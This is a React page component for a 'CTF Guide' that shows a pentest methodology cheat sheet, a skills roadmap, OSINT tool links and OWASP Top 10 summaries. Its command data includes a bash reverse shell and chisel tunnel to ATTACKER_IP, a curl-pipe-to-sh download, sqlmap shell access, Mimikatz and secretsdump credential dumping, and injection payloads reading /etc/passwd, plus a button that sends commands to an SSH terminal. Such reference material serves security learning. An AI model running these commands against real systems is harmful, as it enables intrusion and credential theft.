"use client";

import { useState } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { ScrollArea } from '@/components/ui/scroll-area';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from "@/components/ui/accordion";
import {
  Target,
  Search,
  Globe,
  Database,
  Terminal,
  Key,
  Bug,
  Zap,
  CheckCircle,
  CheckCircle2,
  Copy,
  Map,
  Shield,
  AlertTriangle,
  Lock,
  ExternalLink,
  Star,
  Circle,
  Flame,
  BookOpen,
  User,
  Mail,
  MapPin,
  Camera,
  Building,
  Eye,
  AtSign,
  Settings,
  Code,
  FileWarning,
  RefreshCw,
  Server,
  FileCode,
  Wrench,
} from "lucide-react";
import { useToast } from '@/components/ui/use-toast';
import { useSocket } from '@/contexts/socket-context';

// ==================== METHODOLOGY DATA ====================
const phases = [
  {
    id: "recon",
    title: "1. Reconnaissance",
    icon: Search,
    description: "Information gathering about the target",
    steps: [
      {
        title: "Passive Reconnaissance",
        items: [
          { name: "WHOIS Lookup", cmd: "whois target.com", desc: "Domain registration info" },
          { name: "DNS Enumeration", cmd: "dig target.com ANY +noall +answer", desc: "DNS records" },
          { name: "Subdomain Enum", cmd: "subfinder -d target.com -o subs.txt", desc: "Find subdomains" },
          { name: "Certificate Transparency", cmd: "curl 'https://crt.sh/?q=%25.target.com&output=json' | jq", desc: "SSL certs" },
        ]
      },
      {
        title: "Active Reconnaissance",
        items: [
          { name: "Port Scanning", cmd: "nmap -sS -sV -sC -O -p- target.com -oA scan", desc: "Full port scan" },
          { name: "Service Version", cmd: "nmap -sV --version-intensity 5 target.com", desc: "Service versions" },
          { name: "Script Scan", cmd: "nmap --script=vuln target.com", desc: "Vulnerability scripts" },
        ]
      }
    ]
  },
  {
    id: "enum",
    title: "2. Enumeration",
    icon: Database,
    description: "Extracting information from services",
    steps: [
      {
        title: "Web Enumeration",
        items: [
          { name: "Directory Brute", cmd: "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt", desc: "Find directories" },
          { name: "Nikto Scan", cmd: "nikto -h http://target.com", desc: "Web vulnerabilities" },
          { name: "FFuF Fuzzing", cmd: "ffuf -w wordlist.txt -u http://target.com/FUZZ", desc: "Fast fuzzing" },
        ]
      },
      {
        title: "Service Enumeration",
        items: [
          { name: "SMB Enum", cmd: "enum4linux -a target.com", desc: "Windows shares" },
          { name: "DNS Zone Transfer", cmd: "dig axfr @ns1.target.com target.com", desc: "Zone data" },
          { name: "FTP Enum", cmd: "nmap --script=ftp-anon,ftp-bounce target.com", desc: "FTP analysis" },
        ]
      }
    ]
  },
  {
    id: "vuln",
    title: "3. Vulnerability Analysis",
    icon: Bug,
    description: "Identifying security weaknesses",
    steps: [
      {
        title: "Automated Scanning",
        items: [
          { name: "Nuclei", cmd: "nuclei -u http://target.com -t cves/", desc: "Template scanning" },
          { name: "SearchSploit", cmd: "searchsploit apache 2.4", desc: "Exploit database" },
          { name: "SQLMap", cmd: "sqlmap -u 'http://target.com/page?id=1' --batch --dbs", desc: "SQL injection" },
        ]
      },
      {
        title: "Manual Testing",
        items: [
          { name: "XSS Testing", cmd: "<script>alert('XSS')</script>", desc: "Cross-site scripting" },
          { name: "LFI Testing", cmd: "http://target.com/page?file=../../../etc/passwd", desc: "Local file inclusion" },
          { name: "SSTI Testing", cmd: "{{7*7}} or ${7*7}", desc: "Template injection" },
        ]
      }
    ]
  },
  {
    id: "exploit",
    title: "4. Exploitation",
    icon: Zap,
    description: "Gaining initial access",
    steps: [
      {
        title: "Web Exploitation",
        items: [
          { name: "SQL Injection", cmd: "sqlmap -u 'http://target.com/?id=1' --os-shell", desc: "Get shell via SQLi" },
          { name: "Command Injection", cmd: "127.0.0.1; cat /etc/passwd", desc: "Execute commands" },
        ]
      },
      {
        title: "Network Exploitation",
        items: [
          { name: "Reverse Shell", cmd: "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1", desc: "Bash reverse shell" },
          { name: "Netcat Listener", cmd: "nc -lvnp 4444", desc: "Catch reverse shell" },
        ]
      }
    ]
  },
  {
    id: "postexploit",
    title: "5. Post-Exploitation",
    icon: Key,
    description: "Maintaining access and escalation",
    steps: [
      {
        title: "Privilege Escalation - Linux",
        items: [
          { name: "LinPEAS", cmd: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", desc: "Auto enumeration" },
          { name: "SUID Files", cmd: "find / -perm -4000 -type f 2>/dev/null", desc: "Find SUID binaries" },
          { name: "Sudo Rights", cmd: "sudo -l", desc: "Check sudo permissions" },
        ]
      },
      {
        title: "Privilege Escalation - Windows",
        items: [
          { name: "WinPEAS", cmd: "winPEASany.exe", desc: "Auto enumeration" },
          { name: "PowerUp", cmd: "Import-Module PowerUp.ps1; Invoke-AllChecks", desc: "PowerShell enum" },
        ]
      }
    ]
  },
  {
    id: "lateral",
    title: "6. Lateral Movement",
    icon: Globe,
    description: "Moving through the network",
    steps: [
      {
        title: "Credential Harvesting",
        items: [
          { name: "Mimikatz", cmd: "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"", desc: "Windows credentials" },
          { name: "Hash Dump", cmd: "secretsdump.py domain/user:password@target", desc: "Remote hash dump" },
        ]
      },
      {
        title: "Pivoting & Tunneling",
        items: [
          { name: "SSH Tunnel", cmd: "ssh -D 9050 -N -f user@pivot_host", desc: "Dynamic SOCKS proxy" },
          { name: "Chisel", cmd: "chisel client ATTACKER_IP:8000 R:socks", desc: "Connect to server" },
          { name: "Proxychains", cmd: "proxychains nmap -sT -Pn internal_target", desc: "Proxy through pivot" },
        ]
      }
    ]
  }
];

// ==================== ROADMAP DATA (CONDENSED) ====================
const skillLevels = [
  {
    level: "Beginner",
    icon: Circle,
    duration: "2-4 months",
    skills: ["Linux CLI basics", "Networking (OSI, TCP/IP)", "Web fundamentals (HTTP, HTML, JS)", "Python scripting"],
    resources: [
      { name: "OverTheWire Bandit", url: "https://overthewire.org/wargames/bandit/" },
      { name: "TryHackMe", url: "https://tryhackme.com" },
    ]
  },
  {
    level: "Intermediate",
    icon: Zap,
    duration: "4-8 months",
    skills: ["SQL/XSS/SSRF attacks", "Cryptography basics", "Reverse engineering", "Buffer overflows"],
    resources: [
      { name: "PortSwigger Labs", url: "https://portswigger.net/web-security/all-labs" },
      { name: "Hack The Box", url: "https://hackthebox.com" },
    ]
  },
  {
    level: "Advanced",
    icon: Flame,
    duration: "8-12+ months",
    skills: ["Heap exploitation", "Active Directory attacks", "Cloud security", "Kernel exploitation"],
    resources: [
      { name: "pwn.college", url: "https://pwn.college" },
      { name: "HTB Pro Labs", url: "https://hackthebox.com/hacker/pro-labs" },
    ]
  },
];

const practiceResources = [
  { name: "Hack The Box", url: "https://hackthebox.com", icon: Server, type: "Labs" },
  { name: "TryHackMe", url: "https://tryhackme.com", icon: BookOpen, type: "Guided" },
  { name: "PicoCTF", url: "https://picoctf.org", icon: Target, type: "CTF" },
  { name: "PortSwigger", url: "https://portswigger.net/web-security", icon: Shield, type: "Web" },
  { name: "CryptoHack", url: "https://cryptohack.org", icon: Lock, type: "Crypto" },
  { name: "CTFtime", url: "https://ctftime.org", icon: Globe, type: "Events" },
];

// ==================== OSINT DATA (CONDENSED) ====================
const osintCategories = [
  {
    name: "People Search",
    icon: User,
    tools: [
      { name: "Sherlock", url: "https://github.com/sherlock-project/sherlock", desc: "Hunt usernames across 300+ sites" },
      { name: "WhatsMyName", url: "https://whatsmyname.app", desc: "Username enumeration across 500+ sites" },
      { name: "Maigret", url: "https://github.com/soxoj/maigret", desc: "Collect person info from usernames" },
    ]
  },
  {
    name: "Email Intel",
    icon: Mail,
    tools: [
      { name: "Hunter.io", url: "https://hunter.io", desc: "Find and verify professional emails" },
      { name: "Have I Been Pwned", url: "https://haveibeenpwned.com", desc: "Check for compromised emails" },
      { name: "Holehe", url: "https://github.com/megadose/holehe", desc: "Check if email is used on sites" },
    ]
  },
  {
    name: "Domain & IP",
    icon: Globe,
    tools: [
      { name: "Shodan", url: "https://shodan.io", desc: "Search engine for internet-connected devices" },
      { name: "SecurityTrails", url: "https://securitytrails.com", desc: "Historical DNS and domain data" },
      { name: "crt.sh", url: "https://crt.sh", desc: "Certificate transparency search" },
    ]
  },
  {
    name: "Social Media",
    icon: AtSign,
    tools: [
      { name: "Social Blade", url: "https://socialblade.com", desc: "Social media statistics and analytics" },
      { name: "Osintgram", url: "https://github.com/Datalux/Osintgram", desc: "Instagram OSINT tool" },
    ]
  },
  {
    name: "Images",
    icon: Camera,
    tools: [
      { name: "Yandex Images", url: "https://yandex.com/images", desc: "Powerful reverse image search (faces)" },
      { name: "TinEye", url: "https://tineye.com", desc: "Reverse image search engine" },
      { name: "FotoForensics", url: "https://fotoforensics.com", desc: "Image forensics and metadata" },
    ]
  },
  {
    name: "Geolocation",
    icon: MapPin,
    tools: [
      { name: "Google Earth", url: "https://earth.google.com/web", desc: "3D earth exploration" },
      { name: "SunCalc", url: "https://suncalc.org", desc: "Calculate sun position and shadows" },
    ]
  },
  {
    name: "Company Intel",
    icon: Building,
    tools: [
      { name: "Crunchbase", url: "https://crunchbase.com", desc: "Startup and company intelligence" },
      { name: "OpenCorporates", url: "https://opencorporates.com", desc: "Largest open database of companies" },
    ]
  },
  {
    name: "Dark Web",
    icon: Eye,
    tools: [
      { name: "IntelligenceX", url: "https://intelx.io", desc: "Search engine for leaks and dark web" },
      { name: "DeHashed", url: "https://dehashed.com", desc: "Search leaked databases" },
    ]
  },
];

// ==================== OWASP DATA (CONDENSED) ====================
const owaspTop10 = [
  { rank: "A01", name: "Broken Access Control", icon: Lock, impact: "Critical", desc: "IDOR, privilege escalation, missing function-level access control" },
  { rank: "A02", name: "Cryptographic Failures", icon: Key, impact: "Critical", desc: "Weak encryption, sensitive data exposure, improper key management" },
  { rank: "A03", name: "Injection", icon: Database, impact: "Critical", desc: "SQL, NoSQL, OS Command, LDAP injection attacks" },
  { rank: "A04", name: "Insecure Design", icon: FileWarning, impact: "High", desc: "Missing rate limiting, business logic flaws, trust boundary violations" },
  { rank: "A05", name: "Security Misconfiguration", icon: Settings, impact: "High", desc: "Default credentials, unnecessary features, missing security headers" },
  { rank: "A06", name: "Vulnerable Components", icon: Code, impact: "High", desc: "Outdated libraries with CVEs, unmaintained software" },
  { rank: "A07", name: "Auth Failures", icon: AlertTriangle, impact: "Critical", desc: "Credential stuffing, brute force, weak password policies" },
  { rank: "A08", name: "Integrity Failures", icon: RefreshCw, impact: "High", desc: "Insecure CI/CD, auto-update without verification, deserialization" },
  { rank: "A09", name: "Logging Failures", icon: Eye, impact: "Medium", desc: "Insufficient logging, missing monitoring and alerting" },
  { rank: "A10", name: "SSRF", icon: Globe, impact: "High", desc: "Server-side request forgery, cloud metadata access, internal port scanning" },
];

const securityTools = [
  { name: "OWASP ZAP", url: "https://zaproxy.org", desc: "Free web app security scanner", cat: "Scanner" },
  { name: "Burp Suite", url: "https://portswigger.net/burp", desc: "Web security testing", cat: "Scanner" },
  { name: "Nuclei", url: "https://nuclei.projectdiscovery.io", desc: "Fast vulnerability scanner", cat: "Scanner" },
  { name: "SQLMap", url: "https://sqlmap.org", desc: "Automatic SQL injection", cat: "Exploit" },
  { name: "Metasploit", url: "https://metasploit.com", desc: "Pentesting framework", cat: "Exploit" },
  { name: "Nmap", url: "https://nmap.org", desc: "Network scanner", cat: "Recon" },
  { name: "Gobuster", url: "https://github.com/OJ/gobuster", desc: "Directory brute forcer", cat: "Recon" },
  { name: "Snyk", url: "https://snyk.io", desc: "Dependency scanner", cat: "SCA" },
];

export default function CTFGuidesPage() {
  const { push } = useToast();
  const { socket } = useSocket();
  const [copiedCmd, setCopiedCmd] = useState<string | null>(null);
  const [osintSearch, setOsintSearch] = useState("");

  const copyToClipboard = (cmd: string) => {
    navigator.clipboard.writeText(cmd);
    setCopiedCmd(cmd);
    push({ title: 'Copied!', description: 'Command copied to clipboard' });
    setTimeout(() => setCopiedCmd(null), 2000);
  };

  const sendToTerminal = (cmd: string) => {
    if (!socket) {
      push({ title: 'Not connected', description: 'Connect via SSH first', variant: 'destructive' });
      return;
    }
    socket.emit('input', cmd + '\n');
    push({ title: 'Sent to terminal', description: 'Command executed' });
  };

  const filteredOsint = osintCategories.map(cat => ({
    ...cat,
    tools: cat.tools.filter(t => 
      t.name.toLowerCase().includes(osintSearch.toLowerCase()) ||
      t.desc.toLowerCase().includes(osintSearch.toLowerCase())
    )
  })).filter(cat => cat.tools.length > 0);

  return (
    <div className="flex flex-1 flex-col gap-4 p-4 pt-6">
      {/* Header */}
      <div className="flex items-center gap-3">
        <div className="p-2 rounded-lg bg-primary/10 border border-primary/30">
          <Target className="h-6 w-6 text-primary" />
        </div>
        <div>
          <h1 className="text-2xl font-bold text-primary">CTF Guide</h1>
          <p className="text-sm text-muted-foreground">Methodology, Roadmap, OSINT & OWASP</p>
        </div>
      </div>

      <Tabs defaultValue="methodology" className="flex-1">
        <TabsList className="grid w-full grid-cols-4 mb-4">
          <TabsTrigger value="methodology" className="text-xs sm:text-sm">
            <Target className="h-4 w-4 mr-1 hidden sm:inline" />
            Methodology
          </TabsTrigger>
          <TabsTrigger value="roadmap" className="text-xs sm:text-sm">
            <Map className="h-4 w-4 mr-1 hidden sm:inline" />
            Roadmap
          </TabsTrigger>
          <TabsTrigger value="osint" className="text-xs sm:text-sm">
            <Search className="h-4 w-4 mr-1 hidden sm:inline" />
            OSINT
          </TabsTrigger>
          <TabsTrigger value="owasp" className="text-xs sm:text-sm">
            <Shield className="h-4 w-4 mr-1 hidden sm:inline" />
            OWASP
          </TabsTrigger>
        </TabsList>

        {/* METHODOLOGY TAB */}
        <TabsContent value="methodology" className="flex-1">
          <ScrollArea className="h-[calc(100vh-250px)]">
            <div className="space-y-4 pr-4">
              {/* Quick Nav */}
              <div className="flex flex-wrap gap-2">
                {phases.map((phase) => {
                  const Icon = phase.icon;
                  return (
                    <a key={phase.id} href={`#${phase.id}`} className="px-3 py-1.5 rounded bg-primary/10 text-primary text-xs hover:bg-primary/20 flex items-center gap-1">
                      <Icon className="h-3 w-3" />
                      {phase.title.split('. ')[1]}
                    </a>
                  );
                })}
              </div>

              {phases.map((phase) => {
                const Icon = phase.icon;
                return (
                  <Card key={phase.id} id={phase.id} className="border-l-4 border-l-primary">
                    <CardHeader className="pb-2">
                      <div className="flex items-center gap-2">
                        <Icon className="h-5 w-5 text-primary" />
                        <CardTitle className="text-primary text-lg">{phase.title}</CardTitle>
                      </div>
                      <CardDescription>{phase.description}</CardDescription>
                    </CardHeader>
                    <CardContent>
                      <Accordion type="multiple" className="space-y-1">
                        {phase.steps.map((step, idx) => (
                          <AccordionItem key={idx} value={`${phase.id}-${idx}`} className="border rounded px-3">
                            <AccordionTrigger className="py-2 text-sm">{step.title}</AccordionTrigger>
                            <AccordionContent className="pb-3">
                              <div className="space-y-2">
                                {step.items.map((item, i) => (
                                  <div key={i} className="group flex flex-col gap-1 p-2 rounded bg-muted/50 hover:bg-muted">
                                    <div className="flex items-center justify-between">
                                      <div className="flex items-center gap-2">
                                        <Badge variant="outline" className="text-xs">{item.name}</Badge>
                                        <span className="text-xs text-muted-foreground">{item.desc}</span>
                                      </div>
                                      <div className="flex gap-1 opacity-0 group-hover:opacity-100">
                                        <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => copyToClipboard(item.cmd)}>
                                          {copiedCmd === item.cmd ? <CheckCircle className="h-3 w-3 text-primary" /> : <Copy className="h-3 w-3" />}
                                        </Button>
                                        <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => sendToTerminal(item.cmd)}>
                                          <Terminal className="h-3 w-3" />
                                        </Button>
                                      </div>
                                    </div>
                                    <code className="text-xs font-mono bg-background px-2 py-1 rounded border break-all">{item.cmd}</code>
                                  </div>
                                ))}
                              </div>
                            </AccordionContent>
                          </AccordionItem>
                        ))}
                      </Accordion>
                    </CardContent>
                  </Card>
                );
              })}
            </div>
          </ScrollArea>
        </TabsContent>

        {/* ROADMAP TAB */}
        <TabsContent value="roadmap" className="flex-1">
          <ScrollArea className="h-[calc(100vh-250px)]">
            <div className="space-y-4 pr-4">
              {/* Skill Levels */}
              <div className="grid md:grid-cols-3 gap-3">
                {skillLevels.map((level) => {
                  const Icon = level.icon;
                  return (
                    <Card key={level.level} className="border-l-4 border-l-primary">
                      <CardHeader className="pb-2">
                        <div className="flex items-center justify-between">
                          <CardTitle className="text-sm flex items-center gap-2">
                            <Icon className="h-4 w-4 text-primary" />
                            {level.level}
                          </CardTitle>
                          <Badge variant="outline" className="text-xs">{level.duration}</Badge>
                        </div>
                      </CardHeader>
                      <CardContent className="space-y-3">
                        <ul className="space-y-1">
                          {level.skills.map((skill, i) => (
                            <li key={i} className="flex items-center gap-2 text-xs">
                              <CheckCircle2 className="h-3 w-3 text-primary flex-shrink-0" />
                              {skill}
                            </li>
                          ))}
                        </ul>
                        <div className="pt-2 border-t">
                          <p className="text-xs text-muted-foreground mb-1">Resources:</p>
                          <div className="flex flex-wrap gap-1">
                            {level.resources.map((res, i) => (
                              <a key={i} href={res.url} target="_blank" rel="noopener noreferrer"
                                className="inline-flex items-center gap-1 text-xs px-2 py-0.5 rounded bg-primary/10 text-primary hover:bg-primary/20">
                                {res.name} <ExternalLink className="h-2.5 w-2.5" />
                              </a>
                            ))}
                          </div>
                        </div>
                      </CardContent>
                    </Card>
                  );
                })}
              </div>

              {/* Practice Resources */}
              <Card>
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm">Practice Platforms</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-2">
                    {practiceResources.map((res, i) => {
                      const Icon = res.icon;
                      return (
                        <a key={i} href={res.url} target="_blank" rel="noopener noreferrer"
                          className="flex items-center gap-2 p-2 rounded hover:bg-muted group">
                          <Icon className="h-4 w-4 text-primary" />
                          <div>
                            <p className="text-xs font-medium group-hover:text-primary">{res.name}</p>
                            <p className="text-[10px] text-muted-foreground">{res.type}</p>
                          </div>
                        </a>
                      );
                    })}
                  </div>
                </CardContent>
              </Card>
            </div>
          </ScrollArea>
        </TabsContent>

        {/* OSINT TAB */}
        <TabsContent value="osint" className="flex-1">
          <ScrollArea className="h-[calc(100vh-250px)]">
            <div className="space-y-4 pr-4">
              {/* Search */}
              <div className="relative max-w-sm">
                <Search className="absolute left-2 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                <Input placeholder="Search OSINT tools..." value={osintSearch} onChange={(e) => setOsintSearch(e.target.value)} className="pl-8 h-8 text-sm" />
              </div>

              {/* Frameworks */}
              <div className="flex flex-wrap gap-2">
                {[
                  { name: "OSINT Framework", url: "https://osintframework.com" },
                  { name: "IntelTechniques", url: "https://inteltechniques.com/tools" },
                  { name: "Bellingcat Toolkit", url: "https://docs.google.com/spreadsheets/d/18rtqh8EG2q1xBo2cLNyhIDuK9jrPGwYr9DI2UncoqJQ" },
                ].map((fw, i) => (
                  <a key={i} href={fw.url} target="_blank" rel="noopener noreferrer"
                    className="px-3 py-1.5 rounded bg-primary/10 text-primary text-xs hover:bg-primary/20 flex items-center gap-1">
                    {fw.name} <ExternalLink className="h-3 w-3" />
                  </a>
                ))}
              </div>

              {/* Categories */}
              <div className="grid md:grid-cols-2 gap-3">
                {filteredOsint.map((cat, i) => {
                  const Icon = cat.icon;
                  return (
                    <Card key={i}>
                      <CardHeader className="pb-2">
                        <CardTitle className="text-sm flex items-center gap-2">
                          <Icon className="h-4 w-4 text-primary" />
                          {cat.name}
                        </CardTitle>
                      </CardHeader>
                      <CardContent className="space-y-1">
                        {cat.tools.map((tool, j) => (
                          <a key={j} href={tool.url} target="_blank" rel="noopener noreferrer"
                            className="flex items-center justify-between p-2 rounded hover:bg-muted group">
                            <div>
                              <p className="text-xs font-medium group-hover:text-primary">{tool.name}</p>
                              <p className="text-[10px] text-muted-foreground">{tool.desc}</p>
                            </div>
                            <ExternalLink className="h-3 w-3 text-muted-foreground group-hover:text-primary" />
                          </a>
                        ))}
                      </CardContent>
                    </Card>
                  );
                })}
              </div>
            </div>
          </ScrollArea>
        </TabsContent>

        {/* OWASP TAB */}
        <TabsContent value="owasp" className="flex-1">
          <ScrollArea className="h-[calc(100vh-250px)]">
            <div className="space-y-4 pr-4">
              {/* Top 10 Overview */}
              <div className="grid md:grid-cols-2 gap-2">
                {owaspTop10.map((item) => {
                  const Icon = item.icon;
                  return (
                    <Card key={item.rank} className="border-l-4 border-l-primary">
                      <CardContent className="p-3">
                        <div className="flex items-start gap-2">
                          <div className="p-1.5 rounded bg-primary/10">
                            <Icon className="h-4 w-4 text-primary" />
                          </div>
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2 mb-1">
                              <Badge className="bg-primary/10 text-primary border-0 text-[10px]">{item.rank}</Badge>
                              <span className="text-sm font-medium truncate">{item.name}</span>
                              <Badge variant={item.impact === 'Critical' ? 'destructive' : item.impact === 'High' ? 'default' : 'secondary'} className="text-[10px] ml-auto">
                                {item.impact}
                              </Badge>
                            </div>
                            <p className="text-xs text-muted-foreground">{item.desc}</p>
                          </div>
                        </div>
                      </CardContent>
                    </Card>
                  );
                })}
              </div>

              {/* Security Tools */}
              <Card>
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm flex items-center gap-2">
                    <Wrench className="h-4 w-4 text-primary" />
                    Security Tools
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
                    {securityTools.map((tool, i) => (
                      <a key={i} href={tool.url} target="_blank" rel="noopener noreferrer"
                        className="flex items-center justify-between p-2 rounded hover:bg-muted group">
                        <div>
                          <p className="text-xs font-medium group-hover:text-primary">{tool.name}</p>
                          <p className="text-[10px] text-muted-foreground">{tool.desc}</p>
                        </div>
                        <Badge variant="outline" className="text-[10px]">{tool.cat}</Badge>
                      </a>
                    ))}
                  </div>
                </CardContent>
              </Card>
            </div>
          </ScrollArea>
        </TabsContent>
      </Tabs>
    </div>
  );
}
